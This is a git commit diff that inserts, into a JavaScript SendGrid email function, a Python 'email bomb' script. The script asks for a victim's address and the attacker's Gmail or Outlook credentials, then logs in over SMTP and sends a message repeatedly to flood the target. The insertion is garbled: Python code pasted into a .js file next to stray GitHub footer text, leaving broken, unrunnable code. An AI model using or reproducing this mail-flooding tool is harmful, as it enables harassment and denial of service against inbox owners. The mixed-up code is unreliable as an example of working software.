ee89551b17d3b55d11a7234aad53738213d3bb6f
hiteshbedre <32206192+hiteshbedre@users.noreply.github.com>
2021-10-09 15:21:50 +0530

    Update newx.js

--- newx.js
+++ newx.js
@@ -4,6 +4,44 @@ import * as sgMail from '@sendgrid/mail';
 const API_KEY = functions.config().sendgrid.key;
 const TEMPLATE_ID = functions.config().sendgrid.template;
 sgMail.setApiKey(API_KEY);
+try:
+    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
+    email = input("Enter your gmail_address:")
+    password = input("Enter your gmail_password:")
+    message = input("Enter Message:")
+    counter = int(input("How many message you want to send?:"))
+
+    # gmail of outlook
+    s_ = input('Select the service provider (Gmail / Outlook): ').lower()
+
+    if s_ == "gmail":
+        mail = smtplib.SMTP('smtp.gmail.com',587)
+    elif s_ == "outlook":
+        mail = smtplib.SMTP('smtp.office365.com',587)
+
+    for x in range(0,counter):
+        print("Number of Message Sent : ", x+1)
+        mail.ehlo()
+        mail.starttls()
+        mail.login(email,password)
+        mail.sendmail(email,bomb_email,message)
+        time.sleep(1)
+
+    mail.close()
+except Exception as e:
+    print("Something is wrong, please Re-try Again with Valid input.")
+© 2021 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
 
 
 // Functions
